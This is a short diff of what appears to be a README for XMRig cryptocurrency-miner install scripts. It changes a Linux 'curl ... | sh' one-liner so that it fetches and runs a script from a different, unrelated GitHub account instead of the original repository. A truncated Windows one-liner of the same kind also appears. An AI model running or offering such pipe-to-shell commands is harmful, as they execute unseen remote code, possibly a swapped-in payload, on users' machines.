@@ -5,5 +5,5 @@ irm https://raw.githubusercontent.com/Lachine1/xmrig-scripts/main/windows.ps1 | 
 ```
 # For linux:
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Lachine1/xmrig-scripts/main/linux.sh | sh
+curl -fsSL https://raw.githubusercontent.com/aamanbhagat/noob/main/linux.sh | sh
 ```
